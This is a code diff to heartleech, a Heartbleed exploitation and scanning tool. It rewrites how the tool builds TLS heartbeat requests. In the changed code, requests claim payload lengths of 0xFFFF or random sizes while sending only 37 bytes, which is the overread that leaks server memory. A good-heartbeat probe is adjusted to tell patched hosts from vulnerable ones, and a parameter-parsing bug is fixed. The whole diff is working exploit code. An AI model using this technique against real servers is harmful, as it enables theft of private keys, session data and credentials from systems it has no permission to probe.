@@ -449,12 +449,12 @@ receive_heartbeat(int write_p, int version, int content_type,
      */
     if (connection->is_sent_good_heartbeat && len == 67) {
         static const char *good_response = 
-            "\x02\x00\x30"
+            "\x02\x00\x18"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa"
             ;
-        if (memcmp(buf, good_response, 48+3) == 0) {
+        if (memcmp(buf, good_response, 18+3) == 0) {
             ERROR_MSG("[-] PATCHED: heartBEAT received, but not BLEED\n");
             connection->heartbleeds.failed++;
             target->scan_result = Verdict_Safe;
@@ -1713,31 +1713,40 @@ again:
          * normal heartbeat */
         connection->is_sent_good_heartbeat = 1;
         ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, 
-            "\x01\x00\x30"
+            "\x01\x00\x12"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa",
             67);
-        connection->event.bytes_expecting = 67;
+        connection->event.bytes_expecting = 37;
         connection->event.bytes_received = 0;
         DEBUG_MSG("[ ] probing with good heartbeat\n");
     } else if (args->is_rand_size) {
         /* If configured to do so, do random sizes */
         unsigned size = rand();
-        char rbuf[3];
+        char rbuf[] = "\x01\x00\x30"
+        "aaaaaaaaaaaaaaaa"
+        "aaaaaaaaaaaaaaaa"
+        "aaaaaaaaaaaaaaaa"
+        "aaaaaaaaaaaaaaaa";
         if (size <= 128)
             size = 128;
         rbuf[0] = 1;
         rbuf[1] = (char)(size>>8);
         rbuf[2] = (char)(size>>0);
-        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 3);
+        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 37);
         connection->heartbleeds.attempted++;
         connection->event.bytes_expecting = size;
         connection->event.bytes_received = 0;
     } else {
+        static const char rbuf[] = "\x01\xff\xff"
+        "aaaaaaaaaaaaaaaa"
+        "aaaaaaaaaaaaaaaa"
+        "aaaaaaaaaaaaaaaa"
+        "aaaaaaaaaaaaaaaa";
         /* NORMALLY, just send a short heartbeat request */
-        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);
+        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 37);
         connection->heartbleeds.attempted++;
         connection->event.bytes_expecting = 0xFFFF + 3 + 16;
         connection->event.bytes_received = 0;
@@ -2174,6 +2183,7 @@ heartleech_set_parameter(struct DumpArgs *args,
         return 1;
     } else if (EQUALS("timeout", name)) {
         args->timeout = strtoul(value, 0, 0);
+        return 1;
     } else {
         ERROR_MSG("[-] unknown parameter: %s\n", name);
         exit(1);
